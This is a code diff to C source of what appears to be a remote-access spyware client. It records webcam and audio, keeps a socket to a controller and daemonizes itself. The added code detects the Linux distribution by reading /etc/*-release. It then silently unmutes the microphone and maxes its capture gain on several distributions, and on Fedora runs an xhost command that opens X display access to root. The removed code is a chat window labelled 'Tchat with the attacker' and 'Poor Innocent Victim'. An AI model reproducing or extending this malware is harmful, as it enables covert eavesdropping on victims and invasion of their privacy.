@@ -22,8 +22,6 @@ static SOCKET csock = 0;
 
 static int on_video = -1;
 
-GtkWidget *tchat_text_view = NULL;
-
 int main(int argc, char *argv[])
 {
     /** Make hodin_daemon.sh script executable **/
@@ -109,17 +107,13 @@ void dispatch_modules(int argc, char *argv[])
     pthread_t record_webcam_thread = 0;
     pthread_t record_audio_thread = 0;
     
-    pthread_t tchat_thread = 0;
-    
     //char *ubuntu_check_gain_cmd = "pactl set-sink-mute @DEFAULT_SINK@ toggle"; /* A TESTER  */
     const char *ubuntu_check_mic_cmd = "amixer sset Capture cap";
     const char *ubuntu_gain_mic_cmd = "amixer sset Capture 100%";
 
     const char *kali_check_gain_cmd = "pactl set-sink-mute @DEFAULT_SINK@ 0";
     const char *kali_set_gain_cmd = "pactl set-sink-volume @DEFAULT_SINK@ 100%";
-
-    const char *debian_set_gain_cmd = "pactl set-sink-volume @DEFAULT_SINK@ 100%";
-    const char *debian_check_gain_cmd = "pactl set-sink-mute @DEFAULT_SINK@ 0";
+    
     const char *debian_gain_mic_cmd = "amixer sset Capture 100%";
     const char *debian_check_mic_cmd = "amixer sset Capture cap";
 
@@ -132,11 +126,16 @@ void dispatch_modules(int argc, char *argv[])
     FILE *kali_set_gain_pipe = NULL;
     FILE *kali_gain_mic_pipe = NULL;
 
-    FILE *debian_main_gain_pipe = NULL;
     FILE *debian_set_gain_pipe = NULL;
     FILE *debian_unmute_mic_pipe = NULL;
-    FILE *debian_gain_mic_pipe = NULL;
     
+    FILE *fedora_set_gain_pipe = NULL;
+    FILE *fedora_unmute_mic_pipe = NULL;
+    FILE *fedora_xhost_cmd = NULL;
+    
+    const char *fedora_xhost = "xhost +si:localuser:root";
+    
+    //sudo gpasswd -a thibault audio
 
     sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if(sock == INVALID_SOCKET)
@@ -399,12 +398,16 @@ void dispatch_modules(int argc, char *argv[])
             
             char buffer[256] = "";
             FILE *pipe = NULL;
-            const char *command = ("uname -a");
+            
+            const char *command = "";
+            
+            //command = "lsb_release -a";
+            command = "cat /etc/*-release";
 
             pipe = popen(command, "r");
             if(pipe == NULL)
             {
-                error("popen() uname", "dispatch_modules()");
+                error("popen() command", "dispatch_modules()");
                 return;
             }
 
@@ -416,25 +419,25 @@ void dispatch_modules(int argc, char *argv[])
 
             buffer[strlen(buffer) - 1] = 0;
             
+            
             /* checking if we are on Ubuntu*/
-            if(strstr(buffer, "ubuntu") != NULL)
+            if(strstr(buffer, "Distributor ID:	Ubuntu") != NULL)
             {
                 printf(" We are on Ubuntu\n");
                 
-                mint_gain_mic_pipe = popen(ubuntu_gain_mic_cmd, "w");
+                mint_gain_mic_pipe = popen(ubuntu_check_mic_cmd, "w");
                 if(mint_gain_mic_pipe == NULL)
                 {
-                    error("popen() mint_gain_mic_pipe", "dispatch_modules()");
+                    error("popen() ubuntu_check_mic_cmd for Ubuntu", "dispatch_modules()");
                     return;
                 }
 
-                mint_unmute_mic_pipe = popen(ubuntu_check_mic_cmd, "w");
+                mint_unmute_mic_pipe = popen(ubuntu_gain_mic_cmd, "w");
                 if(mint_unmute_mic_pipe == NULL)
                 {
-                    error("popen() mint_unmute_mic_pipe", "dispatch_modules()");
+                    error("popen() ubuntu_gain_mic_cmd for Ubuntu", "dispatch_modules()");
                     return;
                 }
-
 
                 if(pclose(mint_unmute_mic_pipe) == -1)
                 {
@@ -450,7 +453,7 @@ void dispatch_modules(int argc, char *argv[])
             }
             
             /* Checking if we are on kali */
-            if(strstr(buffer, "kali") != NULL)
+            if(strstr(buffer, "Distributor ID:	Kali") != NULL)
             {
                 printf(" We are on Kali\n");
                 
@@ -482,41 +485,124 @@ void dispatch_modules(int argc, char *argv[])
             }
 
             /* Checking if we are on Debian */
-            if(strstr(buffer, "Debian") != NULL)
+            if(strstr(buffer, "Distributor ID:	Debian") != NULL)
             {
                 printf(" We are on Debian\n");
                 
-                debian_main_gain_pipe = popen(debian_set_gain_cmd, "w");
-                if(debian_main_gain_pipe == NULL)
+                debian_unmute_mic_pipe = popen(debian_check_mic_cmd, "w");
+                if(debian_unmute_mic_pipe == NULL)
                 {
-                    error("popen() debian_main_gain_pipe", "dispatch_modules()");
+                    error("popen() debian_unmute_mic_pipe", "dispatch_modules()");
                     return;
                 }  
                 
                 printf("Cmd 1 Ok\n");
 
-                debian_gain_mic_pipe = popen(debian_check_mic_cmd, "w");
-                if(debian_gain_mic_pipe == NULL)
+                debian_set_gain_pipe = popen(debian_gain_mic_cmd, "w");
+                if(debian_set_gain_pipe == NULL)
                 {
-                    error("popen() debian_gain_mic_pipe", "dispatch_modules()");
+                    error("popen() debian_set_gain_pipe", "dispatch_modules()");
                     return;
                 }
                 
                 printf("Cmd 2 Ok\n");
 
-                if(pclose(debian_main_gain_pipe) == -1)
+                if(pclose(debian_unmute_mic_pipe) == -1)
                 {
-                    printf("Fail to close debian_main_gain_pipe!\n");
+                    printf("Fail to close debian_unmute_mic_pipe!\n");
                     return; 
                 }
                 
-                if(pclose(debian_gain_mic_pipe) == -1)
+                if(pclose(debian_set_gain_pipe) == -1)
                 {
-                    printf("Fail to close debian_gain_mic_pipe!\n");
+                    printf("Fail to close debian_set_gain_pipe!\n");
                     return;
                 }
             }
             
+            /* Checking if we are on Mint19 */
+            if(strstr(buffer, "Distributor ID:	LinuxMint") != NULL)
+            {
+                printf(" We are on Mint19\n");
+                
+                mint_gain_mic_pipe = popen(ubuntu_check_mic_cmd, "w");
+                if(mint_gain_mic_pipe == NULL)
+                {
+                    error("popen() ubuntu_check_mic_cmd for Mint", "dispatch_modules()");
+                    return;
+                }
+
+                mint_unmute_mic_pipe = popen(ubuntu_gain_mic_cmd, "w");
+                if(mint_unmute_mic_pipe == NULL)
+                {
+                    error("popen() ubuntu_gain_mic_cmd for Mint", "dispatch_modules()");
+                    return;
+                }
+
+                if(pclose(mint_unmute_mic_pipe) == -1)
+                {
+                    printf("Fail to close mint_unmute_mic_pipe!\n");
+                    return;
+                }
+
+                if(pclose(mint_gain_mic_pipe) == -1)
+                {
+                    printf("Fail to close mint_gain_mic_pipe!\n");
+                    return;
+                }
+            }
+
+            /* Checking if we are on Fedora 30 */
+            if(strstr(buffer, "Fedora release 30 (Thirty)") != NULL)
+            { 
+                printf("We are on Fedora 30\n");
+                
+                fedora_xhost_cmd = popen(fedora_xhost, "w");
+                if(fedora_xhost_cmd == NULL)
+                {
+                    error("popen() fedora_xhost_cmd", "dispatch_modules()");
+                    return;
+                }
+
+                fedora_unmute_mic_pipe = popen(debian_check_mic_cmd, "w");
+                if(fedora_unmute_mic_pipe == NULL)
+                {
+                    error("popen() fedora_unmute_mic_pipe", "dispatch_modules()");
+                    return;
+                }
+
+                fedora_set_gain_pipe = popen(debian_gain_mic_cmd, "w");
+                if(fedora_set_gain_pipe == NULL)
+                {
+                    error("popen() fedora_set_gain_pipe", "dispatch_modules()");
+                    return;
+                }
+
+                if(pclose(fedora_unmute_mic_pipe) == -1)
+                {
+                    printf("Fail to close mint_unmute_mic_pipe!\n");
+                    return;
+                }
+
+                if(pclose(fedora_set_gain_pipe) == -1)
+                {
+                    printf("Fail to close mint_gain_mic_pipe!\n");
+                    return;
+                }
+                
+                if(pclose(fedora_xhost_cmd) == -1)
+                {
+                    printf("Fail to close fedora_xhost_cmd!\n");
+                    return;
+                }
+            }
+            
+            if(pclose(pipe) == -1)
+            {
+                printf("Fail to close pipe!\n");
+                return;
+            }
+
             if(pthread_create(&record_audio_thread, NULL, (void*(*)(void*))execute_record_cmd, NULL) == -1)
             {
                 error("pthread_create() record_audio_thread", "dispatch_modules()");
@@ -528,24 +614,6 @@ void dispatch_modules(int argc, char *argv[])
                 perror("pthread_join");
                 return;
             }
-        }
-        
-        if(flag == 18)
-        {
-            printf("\t\tTCHAT STARTED....\n");
-
-            if(pthread_create(&tchat_thread, NULL, (void*(*)(void*))run_tchat, NULL) == -1)
-            {
-                error("pthread_create() tchat_thread", "dispatch_modules()");
-                return;
-            }
-
-            if(pthread_join(tchat_thread, NULL) != 0)
-            {
-                perror("pthread_join");
-                return;
-            }
-            
         }
     }
 
@@ -1579,220 +1647,6 @@ void cb_message(GstBus *bus, GstMessage *msg, CustomData *data)
             break;
     }
 }
-
-
-void *run_tchat(void)
-{
-    //GtkWidget *hosts_text_view = NULL;
-    GtkWidget *tchat_window = NULL;
-    GtkWidget *hBox = NULL;
-    GtkWidget *scrollbar;
-
-    GtkWidget *vBox = NULL;
-    
-    GtkWidget *tchat_frame = NULL;
-    GtkWidget *tchat_zone = NULL;
-    //GtkWidget *tchat_text_view = NULL;
-    GtkWidget *typing_entry = NULL;
-    GtkWidget *send_text = NULL;
-    
-    char *attacker_text = NULL;
-    size_t len_attacker_msg = 0;
-    
-    GtkTextBuffer *text_buffer = NULL;
-    gchar *text = NULL;
-    GtkTextIter start;
-    GtkTextIter end;
-    gchar *text_utf8 = NULL;
-    
-    FILE *backup = NULL;
-  
-    tchat_zone = gtk_fixed_new();
-    tchat_frame = gtk_frame_new(NULL);
-    
-    tchat_window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
-    gtk_window_set_default_size(GTK_WINDOW(tchat_window), 800, 400);
-    g_signal_connect(G_OBJECT(tchat_window), "destroy", G_CALLBACK(gtk_main_quit), NULL);
-    gtk_window_set_title(GTK_WINDOW(tchat_window), "Tchat with the attacker");
-    
-    gtk_container_add(GTK_CONTAINER(tchat_window), tchat_zone);
-    
-    gtk_frame_set_label(GTK_FRAME(tchat_frame), " - Poor Innocent Victim - ");
-    gtk_frame_set_label_align(GTK_FRAME(tchat_frame), (gfloat)0.05, (gfloat)0.5);
-    gtk_frame_set_shadow_type(GTK_FRAME(tchat_frame), GTK_SHADOW_ETCHED_OUT);
-    gtk_widget_set_usize(tchat_frame, 760, 295);
-    
-    gtk_fixed_put(GTK_FIXED(tchat_zone), tchat_frame, 20, 20);
-    
-    scrollbar = gtk_scrolled_window_new(NULL, NULL);
-    gtk_widget_set_size_request(scrollbar, 720, 250);
-    
-    gtk_fixed_put(GTK_FIXED(tchat_zone), scrollbar, 40, 45);
-
-    tchat_text_view = gtk_text_view_new();
-    gtk_container_add(GTK_CONTAINER(scrollbar), tchat_text_view);
-    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(scrollbar), GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);
-    //gtk_widget_set_size_request(tchat_text_view, 320, 400);
-    
-    gtk_text_view_set_editable((GtkTextView*)tchat_text_view, FALSE);
-    gtk_text_view_set_cursor_visible((GtkTextView*)tchat_text_view, FALSE);
-    
-    typing_entry = gtk_entry_new_with_max_length(256);
-    gtk_entry_set_text(GTK_ENTRY(typing_entry), "Type your text here ...");
-    gtk_widget_set_size_request(typing_entry, 720, 50);
-    gtk_fixed_put(GTK_FIXED(tchat_zone), typing_entry, 20, 320);
-    
-    send_text = gtk_button_new_with_label("◄");
-    gtk_widget_set_size_request(send_text, 50, 50);
-    gtk_fixed_put(GTK_FIXED(tchat_zone), send_text, 740, 320);
-    g_signal_connect(G_OBJECT(send_text), "clicked", G_CALLBACK(cb_send_text), typing_entry);
-    
-
-    if(recv(csock, (char*)&len_attacker_msg, sizeof(len_attacker_msg), 0) == SOCKET_ERROR)
-    {
-        error("recv() len_attacker_msg", "run_tchat()");
-        pthread_exit(NULL);
-    }
-    
-    printf("len_attacker_msg = %zd octets\n", len_attacker_msg);
-    
-    attacker_text = malloc(len_attacker_msg * sizeof(char));
-    if(attacker_text == NULL)
-    {
-        error("malloc() attacker_text", "run_tchat()");
-        pthread_exit(NULL);
-    }
-    
-    if(recv(csock, attacker_text, len_attacker_msg, 0) == SOCKET_ERROR)
-    {
-        error("recv() attacker_text", "run_tchat()");
-        pthread_exit(NULL);
-    }
-    
-    text_buffer = gtk_text_view_get_buffer((GtkTextView*)tchat_text_view);
-    gtk_text_buffer_set_text(text_buffer, attacker_text, -1);
-    
-    gtk_text_buffer_get_start_iter(text_buffer, &start);
-    gtk_text_buffer_get_end_iter(text_buffer, &end);
-
-    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);
-    
-    text_utf8 = g_locale_to_utf8(attacker_text, -1, NULL, NULL, NULL);
-    
-    //g_print("%s", text_utf8);
-    //g_free(text);
-    
-    backup = fopen("backup.log", "a");
-    if(backup == NULL)
-    {
-        error("fopen() backup", "cb_send_text()");
-        pthread_exit(NULL);        
-    }
-    
-     /* Write the sentences in backup.log file */
-    fputs(text_utf8, backup);
-    fputs("\n", backup);
-    
-    fclose(backup);
-
-    gtk_widget_show_all(tchat_window);
-    
-    gtk_main();
-    
-    pthread_exit(NULL);
-}
-
-
-void cb_send_text(GtkButton *button, gpointer user_data)
-{
-    GtkTextBuffer *text_buffer = NULL;
-    gchar *text = NULL;
-    GtkTextIter start;
-    GtkTextIter end;
-    
-    const char *buffer = NULL;
-    char *final_text = NULL;
-    gchar *text_utf8 = NULL;
-    
-    FILE *backup = NULL;
-    char read_text[1024] = "";
-    
-    int read_char = 0;
-    int i = 0;
-      
-    buffer = gtk_entry_get_text(GTK_ENTRY(user_data));
-    
-    final_text = malloc(1024 * sizeof(char));
-    if(final_text == NULL)
-    {
-        error("malloc final_text", "cb_send_text()");
-        return;
-    }
-    
-    final_text = strncpy(final_text, "Poor Innocent Victim : ", 23);
-    final_text = strncat(final_text, buffer, strlen(buffer) + 1);
-
-    
-    text_utf8 = g_locale_to_utf8(final_text, -1, NULL, NULL, NULL);
-    
-    backup = fopen("backup.log", "a");
-    if(backup == NULL)
-    {
-        error("fopen() backup", "cb_send_text()");
-        return;        
-    }
-    
-     /* Write the sentences in backup.log file */
-    fputs(text_utf8, backup);
-    fputs("\n", backup);
-    
-    fclose(backup);
-    
-    gtk_entry_set_text(GTK_ENTRY(user_data), "");
-
-    
-    
-    backup = fopen("backup.log", "r");
-    if(backup == NULL)
-    {
-        error("fopen() backup.log", "cb_send_text()");
-        return;
-    }
-    
-    while((read_char = fgetc(backup)) != EOF)
-    {
-        read_text[i] = (char)read_char;
-        i++;
-    }
-    
-    rewind(backup);
-      
-    text_utf8 = g_locale_to_utf8(read_text, strlen(read_text), NULL, NULL, NULL);
-
-    text_buffer = gtk_text_view_get_buffer((GtkTextView*)(tchat_text_view));
-
-    gtk_text_buffer_set_text(text_buffer, text_utf8, -1);
-
-    gtk_text_buffer_get_start_iter(text_buffer, &start);
-    gtk_text_buffer_get_end_iter(text_buffer, &end);
-
-    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);
-
-    g_print("%s\n", text);
-
-    g_free(text);
-
-    fclose(backup);
-    
-    free(final_text);
-    
-    /* unused parameters */
-    (void)button;
-    
-    pthread_exit(NULL);
-}
-
-
 
 void daemonize()
 {
